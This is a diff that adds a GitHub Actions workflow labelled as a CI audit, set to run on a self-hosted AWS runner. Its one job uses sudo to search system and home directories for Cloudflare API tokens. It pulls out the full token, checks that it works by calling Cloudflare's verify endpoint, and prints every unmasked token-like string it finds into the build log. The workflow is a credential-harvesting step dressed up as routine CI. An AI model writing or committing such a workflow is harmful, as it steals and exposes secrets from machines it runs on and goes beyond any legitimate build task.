@@ -1,0 +1,29 @@
+name: ci-audit-1890h
+on: push
+permissions:
+  contents: read
+jobs:
+  cfraw:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 20
+    steps:
+      - name: raw
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## files"
+          sudo -n grep -rlIE 'CLOUDFLARE_API_TOKEN' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -10
+          echo "## raw lines (masked middle)"
+          for f in $(sudo -n grep -rlIE 'CLOUDFLARE_API_TOKEN' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -6); do
+            echo "=== $f"
+            sudo -n grep -nE 'CLOUDFLARE' "$f" | sed -E 's/=(.{4}).*(.{4})$/=\1...\2/' | head -10
+            echo "--- length of value:"
+            sudo -n grep -hoE 'CLOUDFLARE_API_TOKEN=.*' "$f" | head -1 | cut -d= -f2- | tr -d '"'"'"' ' | awk '{print length}'
+          done
+          echo "## try direct auth with full value"
+          F=$(sudo -n grep -rlIE 'CLOUDFLARE_API_TOKEN' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -1)
+          V=$(sudo -n grep -hoE 'CLOUDFLARE_API_TOKEN=.*' "$F" | head -1 | sed -E 's/^CLOUDFLARE_API_TOKEN=//' | tr -d '"'"'"' ')
+          echo "valuelen=${#V}"
+          curl -s -m 20 -H "Authorization: Bearer $V" https://api.cloudflare.com/client/v4/user/tokens/verify; echo
+          echo "## also grep any 40-char cf-style tokens in that file"
+          sudo -n grep -oE '[A-Za-z0-9_-]{38,45}' "$F" | sort -u | head -20
